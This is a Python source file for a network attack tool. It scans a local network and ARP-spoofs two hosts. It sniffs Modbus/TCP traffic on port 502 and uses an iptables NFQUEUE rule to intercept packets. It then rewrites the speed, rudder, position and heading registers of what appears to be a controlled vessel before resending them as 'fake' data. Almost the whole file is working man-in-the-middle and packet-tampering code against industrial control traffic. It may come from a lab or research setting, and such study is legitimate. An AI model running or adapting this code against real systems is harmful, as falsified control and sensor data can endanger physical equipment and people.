import subprocess
import time
import scapy.all as scapy 
import threading
from scapy.layers.inet import TCP
from scapy.contrib.modbus import *
import netfilterqueue as nfq
from scapy.layers.inet import IP, TCP
import os
from multiprocessing import Process, Event
from queue import Queue

# Safely decodes and modifies modbus packets. Never scapy unwrap without this class.
class mb:

    func_meanings = {
        1: "Read Coils",
        2: "Read Discrete Inputs",
        3: "Read Holding Registers",
        4: "Read Input Registers",
        5: "Write Single Coil",
        6: "Write Single Register",
        15: "Write Multiple Coils",
        16: "Write Multiple Registers"
    }

    register_meanings = {
        3: "Speed Feedback",    # 12-bit count (X/4095)*5.0
        4: "Rudder Feedback",   # 12-bit count (X/4095)*30
        10: "X Position",       # meters*100
        11: "Y Position",       # meters*100
        12: "Theta (Heading)"   # milli-radians
    }

    def is_modbus(pkt):
        return pkt.haslayer(ModbusADURequest) or pkt.haslayer(ModbusADUResponse)


    # If packet is speed and rudder. This is the useful one to mod
    def is_commands(pkt):
        if not mb.is_modbus(pkt):
            return False
        return pkt.haslayer("Read Holding Registers Response")

    def get_commands(pkt):
        if not mb.is_commands(pkt):
            return "?"
        mbl = pkt.getlayer(ModbusADUResponse)
        pl = getattr(mbl, "payload", "?")
        return getattr(pl, "registerVal", "?")
    
    def get_speed(pkt):
        return mb.get_commands(pkt)[0]

    def set_speed(pkt, new):
        if not mb.is_commands(pkt):
            return False
        mbl = pkt.getlayer(ModbusADUResponse)
        pl = getattr(mbl, "payload", "?")
        rv = getattr(pl, "registerVal", "?")
        rv[0] = new
        setattr(pl, "registerVal", rv)
        return pkt

    def get_rudder(pkt):
        return mb.get_commands(pkt)[1]

    def set_rudder(pkt, new):
        if not mb.is_commands(pkt):
            return False
        mbl = pkt.getlayer(ModbusADUResponse)
        pl = getattr(mbl, "payload", "?")
        rv = getattr(pl, "registerVal", "?")
        rv[1] = new
        setattr(pl, "registerVal", rv)
        return pkt




    # If packet is coords (xyt). This is the useful one to mod
    def is_coord(pkt):
        if not mb.is_modbus(pkt):
            return False
        if pkt.haslayer("Write Single Register"):
            return True

    def get_coord(pkt):
        if not mb.is_coord(pkt):
            return "?"
        mbl = pkt.getlayer(ModbusADURequest)
        pl = getattr(mbl, "payload", "?")
        return getattr(pl, "registerValue", "?")

    def set_coord(pkt, new):
        if not mb.is_coord(pkt):
            return False
        mbl = pkt.getlayer(ModbusADURequest)
        pl = getattr(mbl, "payload", "?")
        setattr(pl, "registerValue", new)
        return pkt
    
    def is_x(pkt):
        if not mb.is_coord(pkt):
            return False
        mbl = pkt.getlayer(ModbusADURequest)
        pl = getattr(mbl, "payload", "?")
        if getattr(pl, "registerAddr", "?") == 10:
            return True
        else:
            return False

    def is_y(pkt):
        if not mb.is_coord(pkt):
            return False
        mbl = pkt.getlayer(ModbusADURequest)
        pl = getattr(mbl, "payload", "?")
        if getattr(pl, "registerAddr", "?") == 11:
            return True
        else:
            return False

    def is_theta(pkt):
        if not mb.is_coord(pkt):
            return False
        mbl = pkt.getlayer(ModbusADURequest)
        pl = getattr(mbl, "payload", "?")
        if getattr(pl, "registerAddr", "?") == 12:
            return True
        else:
            return False


    def get_transId(pkt):
        if not mb.is_modbus(pkt):
            return "?"
        mbl = pkt.getlayer(ModbusADURequest) or pkt.getlayer(ModbusADUResponse)
        return getattr(mbl, "transId", "?")




    def print_scannable(pkt, show_transId = False, show_x = True, show_y = True, show_theta = True, show_speed = True, show_rudder = True, convert = False, print_to_console = True):

        if not (mb.is_commands(pkt) or mb.is_coord(pkt)):
            return

        out = ""

        if show_transId:
            out += f"ID: {mb.get_transId(pkt)}  "
        
        if show_x:
            out += "X:"
            if mb.is_x(pkt):
                x = mb.get_coord(pkt)
                if convert:
                    x = x/100.0
                    out += f"{x:>6.2f}"
                else:
                    out += f"{x:>6}"
            else:
                out += " "*6

        if show_y:
            out += "  Y:"
            if mb.is_y(pkt):
                y = mb.get_coord(pkt)
                if convert:
                    y = y/100.0
                    out += f"{y:>6.2f}"
                else:
                    out += f"{y:>6}"
            else:
                out += " "*6

        if show_theta:
            out += "  Theta:"
            if mb.is_theta(pkt):
                t = mb.get_coord(pkt)
                if convert:
                    t = (t/100.0)
                    out += f"{t:>6.2f}"
                else:
                    out += f"{t:>6}"
            else:
                out += " "*6
        
        if show_speed:
            out += "  Speed:"
            if mb.is_commands(pkt):
                s = mb.get_speed(pkt)
                if convert:
                    s = (s/4095.0) * 5.0
                    out += f"{s:>6.4f}"
                else:
                    out += f"{s:>6}"
            else:
                out += " "*6

        if show_rudder:
            out += "  Rudder:"
            if mb.is_commands(pkt):
                r = mb.get_rudder(pkt)
                if convert:
                    r = (r/4095.0) * 30.0
                    out += f"{r:>2.3}"
                else:
                    out += f"{r:>6}"
            else:
                out += " "*6
        if print_to_console:
            print(out)
        else:
            return out


    
    '''
    useful pkt info:
    pkt.summary()
    modbus_layer.funcCode
    modbus_layer.payload
    '''

class config:
    put_all: bool = False
    do_mods = False
    xm = 1
    ym = 1
    tm = 1
    sm = 1
    rm = 1
    xo = 0
    yo = 0
    to = 0
    so = 0
    ro = 0
    def to_string():
        return f"Mods\tx\ty\tt\ts\tr\nmult:\t{config.xm}\t{config.ym}\t{config.tm}\t{config.sm}\t{config.rm}\noffset:\t{config.xo}\t{config.yo}\t{config.to}\t{config.so}\t{config.ro}"
    queue_size: int = 500
    put_real: bool = True
    put_fake: bool = True
    def reset():
        config.xm = 1
        config.ym = 1
        config.tm = 1
        config.sm = 1
        config.rm = 1
        config.xo = 0
        config.yo = 0
        config.to = 0
        config.so = 0
        config.ro = 0

# Queues the packets for the GUI to poll
class buffer:

    packet_queue = Queue(maxsize=config.queue_size)
    number = 1

    def pop():
        try:
            return buffer.packet_queue.get_nowait()
        except:
            return 

    # What does the GUI need?
    '''
    Name            key                                     purpose
    Version         .version   "real" or "fake"             boat map        network map         wireshark
    Source          .src                                                    network map         wireshark
    Destination     .dst                                                    network map         wireshark
    Variable        .var                                    boat map
    Value           .val                                    boat map

    No.             .no                                                                         wireshark
    Transaction ID  .transId                                                                    wireshark
    Time            .time                                                                       wireshark
    Length          .len                                                                        wireshark
    Info string     .info                                                                       wireshark
    
    '''

    class PacketData:
        def __init__(self, pkt, version):

            self.version = version

            self.source = pkt[IP].src
            self.destination = pkt[IP].dst

            if mb.is_x(pkt):
                self.variable = "X"
                self.values = [mb.get_coord(pkt)]
            elif mb.is_y(pkt):
                self.variable = "Y"
                self.values = [mb.get_coord(pkt)]
            elif mb.is_theta(pkt):
                self.variable = "Theta"
                self.values = [mb.get_coord(pkt)]
            elif mb.is_commands(pkt):
                self.variable = "Commands"
                self.values = [mb.get_commands(pkt)]
            else:
                self.variable = "None"
                self.values = ["None"]

            self.transId = mb.get_transId(pkt)

            self.number = buffer.number
            buffer.number += 1
            
            self.timestamp = time.time()
            self.length = len(pkt[TCP].payload)
            self.info = pkt.summary()
            self.scannable = mb.print_scannable(pkt, print_to_console=False, convert=True)


    def put(pkt, version):
        p = buffer.PacketData(pkt, version)
        try:
            buffer.packet_queue.put_nowait(p)
            return True
        except:
            # print("Buffer full")
            buffer.clear()
            return False

    def clear():
        while not buffer.packet_queue.empty():
            buffer.packet_queue.get()

    def size():
        return buffer.packet_queue.qsize()
    
    '''

        register_value[0] = int(register_value[0])*matrix[3][0] + matrix[3][1]
        register_value[1] = int(register_value[1])*matrix[4][0] + matrix[4][1]
        return pkt

        # Position data: alter based on register addr
        if getattr(modbus_layer, "funcCode", "?") == 6:
            register_addr = getattr(pdu, "registerAddr", "?")
            register_value = getattr(pdu, "registerValue", "?")
            if register_addr == "?" or register_value == "?":
                return pkt
            # X
            if register_addr == 10:
                register_value = int(register_value)*matrix[0][0] + matrix[0][1]
            # Y
            elif register_addr == 11:
                register_value = int(register_value)*matrix[1][0] + matrix[1][1]
            # Theta
            elif register_addr == 12:
                register_value = int(register_value)*matrix[2][0] + matrix[2][1]
            return pkt
            
        
        # Recalculate fields
        if pkt.haslayer(ModbusADURequest):
            del pkt[ModbusADURequest].len
        if pkt.haslayer(ModbusADUResponse):
            del pkt[ModbusADUResponse].len

        del pkt[TCP].chksum

        return pkt
        '''

# Handles nfq. Start, stop, handler, etc.
class net_filter_queue:

    def stop():
        try:
            net_filter_queue.stop_event
        except:
            return
        net_filter_queue.stop_event.set()
        net_filter_queue.process.join(timeout=2)

    def packet_listener(nfq_pkt):
        mod = False
    
        pkt=IP(nfq_pkt.get_payload())

        mb.print_scannable(pkt, show_transId=True)

        # Modify values 
        if mod:
            if mb.is_commands(pkt):
                buffer.put(pkt, "Incoming")
                pkt = mb.set_speed(pkt, mb.get_speed(pkt)*config.sm + config.so)
                pkt = mb.set_speed(pkt, mb.get_rudder(pkt)*config.rm + config.ro)
            elif mb.is_coord(pkt):
                buffer.put(pkt, "Incoming")
                if mb.is_x(pkt):
                    pkt = mb.set_coord(pkt, mb.get_coord(pkt)*config.xm + config.xo)
                elif mb.is_y(pkt):
                    pkt = mb.set_coord(pkt, mb.get_coord(pkt)*config.ym + config.yo)
                elif mb.is_theta(pkt):
                    pkt = mb.set_coord(pkt, mb.get_coord(pkt)*config.tm + config.to)
                buffer.put(pkt,"Outgoing")
        
        mb.print_scannable(pkt, show_transId=False)
                

        del pkt[TCP].chksum
        del pkt[IP].chksum
        # packet.set_payload(bytes(pl))

        # packet.set_payload(bytes(pl))


        nfq_pkt.drop()
        scapy.send(pkt)


                    

    def __setdown():
        os.system("sudo iptables -t mangle -D PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1") 

    def start_worker(stop_event):
        os.system("sudo iptables -t mangle -A PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1")

        queue = nfq.NetfilterQueue()
        queue.bind(1, net_filter_queue.packet_listener)

        print("Starting Attack")

        try:
            while not stop_event.is_set():
                queue.run(block=False)
                time.sleep(0.01)
        finally:
            print("Stopping sniffing")
            queue.unbind()
            net_filter_queue.__setdown()

    def start():
        stop_event = Event()
        net_filter_queue.stop_event = stop_event
        p = Process(
            target=net_filter_queue.start_worker,
            args=(stop_event,),
            daemon=True
        )
        p.start()
        net_filter_queue.process = p

# Handles sniffing. Start, stop
class scapy_sniffing:
    sniffer = None
        
    def start(print_console = False, put_buffer = True):
        def handle_packet(pkt):
            # Modbus/TCP runs over TCP port 502
            if pkt.haslayer(TCP) and (pkt[TCP].sport == 502 or pkt[TCP].dport == 502):
                if mb.is_coord(pkt) or mb.is_commands(pkt):
                    if print_console:
                        mb.print_scannable(pkt, convert=True)
                    if put_buffer:
                        buffer.put(pkt, "Real")

        scapy_sniffing.sniffer = scapy.AsyncSniffer(
            filter="tcp port 502",
            prn=handle_packet,
            store=False
        )

        scapy_sniffing.sniffer.start()

    def stop():
        if scapy_sniffing.sniffer:
            scapy_sniffing.sniffer.stop()
            scapy_sniffing.sniffer = None

# Handles arp spoofing. Start, stop.
class arp_spoofing:

    def get_mac1(ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/ arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbos = False)[0]
        return answered_list[0][1].hwsrc

    def get_mac(ip):
        '''return MAC address of any device connected to the network
        If ip is down return None'''
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/ arp_request
        answered_list, _ = scapy.srp(arp_request_broadcast, timeout=5)
        if answered_list:
            return answered_list[0][1].src


    def spoof(target_ip, spoof_ip, verbose=True):
        '''
        Spoofs 'target_ip' saying that we are host_ip'''

        packet = scapy.ARP(op='is-at', pdst=target_ip, hwdst = arp_spoofing.get_mac(target_ip), psrc = spoof_ip)
        # arp_spoofing.saved_packets.append(packet.summary())
        # print("PACKET PACKET YUP\n\n")
        # packet.show()
        # print("\n\nPACKET PACKET YUP")
        scapy.send(packet, verbose = False)
        if verbose:
            #get the MAC address of the default interface we are using
            self_mac = scapy.ARP().hwsrc  
            # print("[+] Sent to {} : {} is-at {}".format(target_ip, spoof_ip, self_mac))

    def restore(destination_ip, source_ip):
        destination_mac = arp_spoofing.get_mac(destination_ip)
        source_mac = arp_spoofing.get_mac(source_ip)
        packet = scapy.ARP(op = 2, pdst=destination_ip,
                hwdst = destination_mac,
                psrc = source_ip, hwsrc = source_mac)
        scapy.send(packet, verbose = False)



    def start(target = '192.168.8.137', host = '192.168.8.243', silence = True):
        # Stop printing so much
        if silence:
            conf.verb = 0
        
        arp_spoofing.running = True

        # Initialize saved packets
        arp_spoofing.saved_packets = []
        
        #victom ip address
        arp_spoofing.target = target

        #gateway ip
        arp_spoofing.host = host

        # True = print, False = no print
        arp_spoofing.verbose = not silence

        def interval():
            if arp_spoofing.running:
                #Telling the target that we are the host
                arp_spoofing.spoof(arp_spoofing.target, arp_spoofing.host, arp_spoofing.verbose)

                # Telling the host that we are the target
                arp_spoofing.spoof(arp_spoofing.host, arp_spoofing.target, arp_spoofing.verbose)

                # rerun in a second
                timer = threading.Timer(1.0, interval)
                timer.start()
        interval()
                
    def stop():

        # Don't fail if already stopped
        try:
            arp_spoofing.running
        except:
            return

        arp_spoofing.running = False

        arp_spoofing.restore(arp_spoofing.target, arp_spoofing.host)
        arp_spoofing.restore(arp_spoofing.host, arp_spoofing.target)

        print("Stopped ARP Spoof")

# Handles nmapping. get hosts
class nmapping:

# Dealing with hosts
    def get_hosts(network, iface="wlp0s20f3"):
        packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=network)
        answered, _ = scapy.srp(packet, timeout=2, verbose=False)

        hosts = []
        for _, recv in answered:
            hosts.append({
                "ip": recv.psrc,
                "mac": recv.hwsrc
            })
        return hosts

    def get_host_ips(current_address):
        hosts = nmapping.get_hosts(current_address)
        out = []
        for h in hosts:
            out.append(h["ip"])
        return out

    # {'ip': '192.168.8.1', 'mac': '94:83:c4:52:fa:b2'}
    # {'ip': '192.168.8.137', 'mac': '34:85:18:92:02:6c'}
    # {'ip': '192.168.8.243', 'mac': '34:cd:b0:33:85:b4'}
    def print_hosts(current_address):
        hosts = nmapping.get_hosts(current_address)
        for h in hosts:
            print(h)
    
    class infer:
        def vendor(mac):
            return conf.manufdb._get_manuf(mac)

        def dns(ip):
            try:
                return socket.gethostbyaddr(ip)[0]
            except:
                return None
        def os(ip):
            pkt = sr1(IP(dst=ip)/ICMP(), timeout=1, verbose=False)
            if not pkt:
                return None

            ttl = pkt.ttl
            if ttl <= 64:
                return "Linux / Android / IoT"
            elif ttl <= 128:
                return "Windows"
            elif ttl <= 255:
                return "Network device"

    def print_host_info(devices):
        for d in devices:
            
            d["vendor"] = nmapping.infer.vendor(d["mac"])
            d["hostname"] = nmapping.infer.dns(d["ip"])
            d["os_guess"] = nmapping.infer.os(d["ip"])
            print("\n",d["hostname"])
            print("\tip:\t",d["ip"])
            print("\tmac:\t",d["mac"])
            print("\tvendor:\t",d["vendor"])
            print("\tos guess:\t",d["os_guess"])
            print("\tIP:",d["ip"])
    
    def get_host_info(devices):
        for d in devices:
            
            d["vendor"] = nmapping.infer.vendor(d["mac"])
            d["hostname"] = nmapping.infer.dns(d["ip"])
            d["os_guess"] = nmapping.infer.os(d["ip"])
        return devices

# Dealing with local
    def get_local_ip(prefix=24):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
        finally:
            s.close()

        return f"{ip}/{prefix}"

    



if __name__ == "__main__":

    nmapping.print_hosts(nmapping.get_local_ip())

    print(f"\nYour IP: {nmapping.get_local_ip()}")


    ips = nmapping.get_host_ips(nmapping.get_local_ip())
    
    print("\nLocal devices found:\n","\n".join(ips),"\n\n")

    devices = nmapping.get_hosts(nmapping.get_local_ip())

    print("Device Information")

    nmapping.print_host_info(devices)
    
    device_info = nmapping.get_host_info(devices)
    

    


    ip1 = input("Enter ip 1\n\n")
    ip2 = input("Enter ip 2\n\n")

    arp_spoofing.start(ip1, ip2, silence=True)

    input("Press Enter to continue\n\n")

    scapy_sniffing.start(print_console=True, put_buffer=False)

    time.sleep(10)

    scapy_sniffing.stop()
    arp_spoofing.stop()

    
def abort_all():
    scapy_sniffing.stop()
    net_filter_queue.stop()
    arp_spoofing.stop()
    buffer.clear()
    config.reset()

    # NEXT why is nfq so slow? because it's interrupting traffic. why?